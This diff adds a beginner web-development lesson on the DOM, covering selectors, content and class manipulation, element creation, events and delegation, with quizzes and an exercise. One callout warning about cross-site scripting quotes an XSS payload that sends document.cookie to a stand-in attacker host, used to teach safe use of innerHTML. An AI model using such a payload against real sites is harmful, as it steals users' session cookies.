@@ -1,0 +1,307 @@
+Your HTML creates a page. Your JavaScript can calculate. But so far the two have never spoken to each other. The bridge is the **DOM** — the Document Object Model.
+
+When the browser parses your HTML, it builds a live tree of objects in memory. JavaScript can read that tree, change it, and listen for events on it. Every interactive website you have ever used — dropdowns, modals, live search, to-do lists — is JavaScript editing the DOM.
+
+## The DOM is a live object tree
+
+Given this HTML:
+
+```html
+<body>
+  <h1 id="title">Welcome</h1>
+  <ul class="tasks">
+    <li>Learn HTML</li>
+    <li>Learn CSS</li>
+  </ul>
+</body>
+```
+
+The browser builds this structure:
+
+```text
+document
+└── html
+    └── body
+        ├── h1#title ("Welcome")
+        └── ul.tasks
+            ├── li ("Learn HTML")
+            └── li ("Learn CSS")
+```
+
+Every box is an object with properties and methods. The global entry point is `document`. Open DevTools, go to the Console, and try:
+
+```js
+document.title            // the page title
+document.querySelector('h1').textContent // 'Welcome'
+```
+
+The Elements panel shows the same tree the browser built — not necessarily the HTML you typed. This is why invalid markup is so confusing: the browser silently repairs it, and your JavaScript then queries a tree you did not intend.
+
+## Selecting elements
+
+You select elements with CSS selectors:
+
+```js
+const title = document.querySelector('h1')        // first match or null
+const links = document.querySelectorAll('.nav a') // every match
+const app = document.getElementById('app')        // one element, no #
+```
+
+`querySelector` and `querySelectorAll` accept any CSS selector, which means everything you learned in the CSS lesson applies here: classes, descendant selectors, attribute selectors, pseudo-classes.
+
+`querySelectorAll` returns a **NodeList**, not an array. It has `.length` and works with `for...of`, but not with `map` or `filter`:
+
+```js
+for (const link of links) {
+  console.log(link.textContent)
+}
+```
+
+<Callout type="danger" title="querySelector can return null">
+  If nothing matches, you get `null`, and reading any property on it throws `TypeError: Cannot read properties of null`. Check first:
+
+  ```js
+  const title = document.querySelector('h1')
+  if (title) title.textContent = 'Updated'
+  ```
+</Callout>
+
+## Reading and changing content
+
+```js
+const heading = document.querySelector('#title')
+
+heading.textContent          // read: 'Welcome'
+heading.textContent = 'Hello!' // write: replaces the text
+
+const input = document.querySelector('#email')
+input.value                  // current value of a form control
+```
+
+Use `textContent` for text. It never interprets HTML, so it is safe and fast.
+
+`innerHTML` parses HTML tags — useful when you intentionally build markup, dangerous when the content comes from a user:
+
+```js
+// Never do this with user input:
+commentBox.innerHTML = userComment
+```
+
+<Callout type="danger" title="innerHTML and user input do not mix">
+  If `userComment` contains `<img src=x onerror="fetch('https://evil.example/' + document.cookie)">`, the browser will run it. This is cross-site scripting (XSS). Use `textContent` for user data and `createElement` for markup you build yourself.
+</Callout>
+
+Attributes and classes have dedicated APIs:
+
+```js
+link.getAttribute('href')          // read an attribute
+link.setAttribute('href', '/home') // write one
+
+const card = document.querySelector('.card')
+card.classList.add('active')       // add
+card.classList.remove('active')    // remove
+card.classList.toggle('active')    // add if missing, remove if present
+card.classList.contains('active')  // true / false
+```
+
+Inline styles work (`card.style.color = 'red'`), but classes are better: they keep styling rules in CSS where they belong, and they are easier to undo.
+
+Custom data lives in `data-` attributes, exposed through `dataset`:
+
+```html
+<li data-id="42" data-status="open">Fix the sink</li>
+```
+
+```js
+const item = document.querySelector('li')
+item.dataset.id      // '42' — always a string
+item.dataset.status  // 'open'
+```
+
+## Creating and removing elements
+
+You build new DOM nodes in three steps: create, configure, insert.
+
+```js
+const list = document.querySelector('.tasks')
+
+const li = document.createElement('li')
+li.textContent = 'Learn the DOM'
+li.dataset.id = '3'
+li.classList.add('task')
+
+list.append(li) // adds inside, at the end
+```
+
+- `append` accepts multiple nodes and plain strings.
+- `prepend` inserts at the start.
+- `li.remove()` deletes a node from the DOM.
+
+To build a list from an array:
+
+```js
+const tasks = ['Learn HTML', 'Learn CSS', 'Learn DOM']
+
+for (const task of tasks) {
+  const li = document.createElement('li')
+  li.textContent = task
+  list.append(li)
+}
+```
+
+## Events
+
+Elements emit **events**: clicks, typing, submitting, key presses, scrolling. You subscribe with `addEventListener`:
+
+```js
+const button = document.querySelector('#save')
+
+button.addEventListener('click', () => {
+  console.log('Clicked!')
+})
+```
+
+The handler receives an **event object** with useful details:
+
+```js
+document.querySelector('input').addEventListener('input', (event) => {
+  console.log(event.target.value) // the current text
+})
+
+document.querySelector('form').addEventListener('submit', (event) => {
+  event.preventDefault() // stop the browser from reloading the page
+  console.log('Form submitted')
+})
+```
+
+- `event.target` is the element that fired the event.
+- `event.currentTarget` is the element the listener is attached to (useful with delegation).
+- `event.preventDefault()` cancels the browser’s default behaviour — page reload on submit, navigation on link click.
+- `event.key` tells you which key was pressed in keyboard events.
+
+<Callout type="tip" title="Scripts and the DOM">
+  If your script runs before the HTML exists, every selection returns `null`. Load scripts with `defer`, or place them at the end of `<body>`. This one habit prevents most beginner “why is my element null?” bugs.
+</Callout>
+
+## Bubbling and event delegation
+
+When you click a button inside a list item inside a list, the event fires on the button, then **bubbles up** through every ancestor. That behaviour enables a powerful pattern: put one listener on the parent instead of one per child.
+
+```js
+const list = document.querySelector('.tasks')
+
+list.addEventListener('click', (event) => {
+  const deleteButton = event.target.closest('[data-action="delete"]')
+  if (!deleteButton) return
+
+  deleteButton.closest('li').remove()
+})
+```
+
+`closest` walks up from the clicked element looking for a match, so the listener still works when new items are added tomorrow.
+
+<KeyPoint>
+One listener on a parent beats a hundred listeners on children — and it is the only approach that works for elements you have not created yet.
+</KeyPoint>
+
+## Putting it together: a counter
+
+This small app shows the pattern behind every UI framework, including React:
+
+```html
+<div class="counter">
+  <button id="decrease" aria-label="Decrease">−</button>
+  <span id="count">0</span>
+  <button id="increase" aria-label="Increase">+</button>
+</div>
+
+<script defer>
+  let count = 0
+  const output = document.querySelector('#count')
+
+  function render() {
+    output.textContent = count
+  }
+
+  document.querySelector('#increase').addEventListener('click', () => {
+    count += 1
+    render()
+  })
+
+  document.querySelector('#decrease').addEventListener('click', () => {
+    count -= 1
+    render()
+  })
+</script>
+```
+
+State (`count`) changes, then a `render` function updates the DOM to match. React will formalize exactly this loop — you are learning the concept underneath the framework before you use it.
+
+## Try it
+
+<TryIt title="A live character counter">
+```html
+<textarea id="message" maxlength="120" rows="3"></textarea>
+<p><span id="used">0</span> / 120 characters</p>
+
+<script defer>
+  const message = document.querySelector('#message')
+  const used = document.querySelector('#used')
+
+  message.addEventListener('input', () => {
+    used.textContent = message.value.length
+  })
+</script>
+```
+</TryIt>
+
+## Check your understanding
+
+<Quiz
+  question="Why is element.textContent safer than element.innerHTML for user input?"
+  options={[
+    'textContent is faster to type',
+    'textContent treats the input as plain text, while innerHTML parses it as HTML and can run it',
+    'innerHTML only works on divs',
+    'There is no difference'
+  ]}
+  answer={1}
+  explanation="innerHTML parses markup, so user input like <img onerror=...> can execute. textContent renders the same characters as harmless text."
+/>
+
+<Quiz
+  question="Inside a form submit handler, what does event.preventDefault() do?"
+  options={[
+    'Stops the event from bubbling to parents',
+    'Stops the browser’s default action, such as reloading the page',
+    'Removes the submit listener permanently',
+    'Prevents all future submit events'
+  ]}
+  answer={1}
+  explanation="The default action for a form submit is to send a request and reload the page. preventDefault cancels that so your JavaScript can handle the data. stopPropagation is the separate tool for bubbling."
+/>
+
+<Exercise title="Build an interactive task list" difficulty="medium">
+Create `index.html`, `script.js` (loaded with `defer`), and a small `<style>` block. Build a task list that behaves like a real app:
+
+1. Markup: a `<form id="new-task">` with a labelled text input and a submit button, a `<ul id="task-list">`, and a `<span id="task-count">`.
+2. On form submit: call `preventDefault()`, read the input with `.value`, and ignore empty or whitespace-only input.
+3. Create an `<li>` with the task text and a delete `<button data-action="delete">`. Append it, clear the input, and keep focus in the input.
+4. Attach **one** click listener to the `<ul>` (delegation). Clicking delete removes the item; clicking the task text toggles a `done` class on the `<li>`.
+5. Style `.done` with `text-decoration: line-through` and reduced opacity.
+6. After every change, update `#task-count` to show how many tasks remain (not completed).
+7. Verify that tasks added later still respond to clicks — that is the payoff of delegation.
+8. Bonus: persist the list in `localStorage` so tasks survive a page reload.
+</Exercise>
+
+## Summary
+
+- The browser builds a live object tree (the DOM) from your HTML; `document` is the entry point.
+- Select with `querySelector`, `querySelectorAll`, and `getElementById`; guard against `null`.
+- Use `textContent` for text and `value` for form controls; never inject user input with `innerHTML`.
+- Change appearance through `classList`, not inline styles.
+- Create elements with `createElement`, configure them, then `append`; remove with `.remove()`.
+- Listen with `addEventListener`, learn the event object, and use `preventDefault` on form submits.
+- Let events bubble and delegate to a parent — it keeps working for elements that do not exist yet.
+
+You can now build interactive pages. Next: asynchronous JavaScript, where the page waits for data without freezing — the skill every API call depends on.
